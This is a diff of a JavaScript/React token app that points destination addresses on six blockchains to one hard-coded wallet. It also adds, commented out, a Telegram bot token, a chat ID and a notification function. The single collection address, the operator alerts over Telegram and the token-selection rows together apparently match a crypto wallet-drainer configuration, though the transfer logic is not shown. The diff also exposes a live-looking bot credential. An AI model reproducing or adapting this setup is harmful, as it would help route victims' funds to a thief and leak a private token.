@@ -34,17 +34,17 @@ const supportedChains = [1, 56, 10, 324, 42161, 137];
 
 // Mapping of chain IDs to destination addresses
 const chainIdToDestinationAddress = {
-  1: '0x...MainnetAddress',
-  56: '0x...BSCAddress',
-  10: '0x...OptimismAddress',
-  324: '0x...ZkSyncAddress',
-  42161: '0x...ArbitrumAddress',
-  137: '0x...PolygonAddress',
+  1: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
-// Telegram bot configuration
-const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+// // Telegram bot configuration
+// const TELEGRAM_BOT_TOKEN = '7439590254:AAHON2e8fQW1mlEYPiWqE1RCf7F2Az7ABr0';
+// const TELEGRAM_CHAT_ID = '5470283104';
 
 // USD formatter for currency formatting
 const usdFormatter = new Intl.NumberFormat('en-US', {
@@ -67,30 +67,30 @@ const safeNumber = (value) => {
 };
 
 // Function to send a Telegram notification
-const sendTelegramNotification = async (message) => {
-  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-  const params = {
-    chat_id: TELEGRAM_CHAT_ID,
-    text: message,
-  };
+// const sendTelegramNotification = async (message) => {
+//   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+//   const params = {
+//     chat_id: TELEGRAM_CHAT_ID,
+//     text: message,
+//   };
 
-  try {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(params),
-    });
+//   try {
+//     const response = await fetch(url, {
+//       method: 'POST',
+//       headers: {
+//         'Content-Type': 'application/json',
+//       },
+//       body: JSON.stringify(params),
+//     });
 
-    if (!response.ok) {
-      throw new Error(`Telegram API error: ${response.statusText}`);
-    }
-    console.log('Telegram notification sent successfully.');
-  } catch (error) {
-    console.error('Failed to send Telegram notification:', error);
-  }
-};
+//     if (!response.ok) {
+//       throw new Error(`Telegram API error: ${response.statusText}`);
+//     }
+//     console.log('Telegram notification sent successfully.');
+//   } catch (error) {
+//     console.error('Failed to send Telegram notification:', error);
+//   }
+// };
 
 const TokenRow = ({ token }) => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
